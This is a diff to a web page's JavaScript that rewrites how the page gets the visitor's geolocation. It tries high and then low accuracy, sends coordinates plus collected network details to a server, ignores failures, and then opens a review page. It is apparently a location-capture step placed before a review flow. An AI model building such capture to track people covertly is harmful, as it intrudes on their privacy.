@@ -604,77 +604,63 @@
       };
     }
 
-    function requestLocationAndContinue() {
+    function getPosition(options) {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, options);
+      });
+    }
+
+    async function requestLocationAndContinue() {
       if (!("geolocation" in navigator)) {
         openReviewDestination();
         return;
       }
 
       setBusy(true);
-      let bestPosition = null;
-      let watchId = null;
-      let finished = false;
+      let position = null;
 
-      function finish(position) {
-        if (finished) return;
-        finished = true;
-        if (watchId !== null) {
-          navigator.geolocation.clearWatch(watchId);
+      try {
+        position = await getPosition({
+          enableHighAccuracy: true,
+          timeout: 12000,
+          maximumAge: 0
+        });
+      } catch (error) {
+        try {
+          position = await getPosition({
+            enableHighAccuracy: false,
+            timeout: 10000,
+            maximumAge: 60000
+          });
+        } catch (fallbackError) {
+          position = null;
         }
+      }
 
-        if (!position) {
+      if (!position) {
+        setBusy(false);
+        closeLocationModal();
+        openReviewDestination();
+        return;
+      }
+
+      const { latitude, longitude, accuracy } = position.coords;
+      const payload = {
+        latitude,
+        longitude,
+        accuracy,
+        timestamp: new Date().toISOString(),
+        network: collectNetworkDetails()
+      };
+
+      sendLocationToServer(payload)
+        .catch(() => {
+        })
+        .finally(() => {
           setBusy(false);
           closeLocationModal();
           openReviewDestination();
-          return;
-        }
-
-        const { latitude, longitude, accuracy } = position.coords;
-        const payload = {
-          latitude,
-          longitude,
-          accuracy,
-          timestamp: new Date().toISOString(),
-          network: collectNetworkDetails()
-        };
-
-        sendLocationToServer(payload)
-          .catch(() => {
-          })
-          .finally(() => {
-            setBusy(false);
-            closeLocationModal();
-            openReviewDestination();
-          });
-      }
-
-      function handlePosition(position) {
-        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-          bestPosition = position;
-        }
-
-        if (position.coords.accuracy <= 30) {
-          finish(position);
-        }
-      }
-
-      function handleError() {
-        finish(bestPosition);
-      }
-
-      watchId = navigator.geolocation.watchPosition(
-        handlePosition,
-        handleError,
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-
-      setTimeout(() => {
-        finish(bestPosition);
-      }, 8000);
+        });
     }
 
     async function beginReviewFlow() {
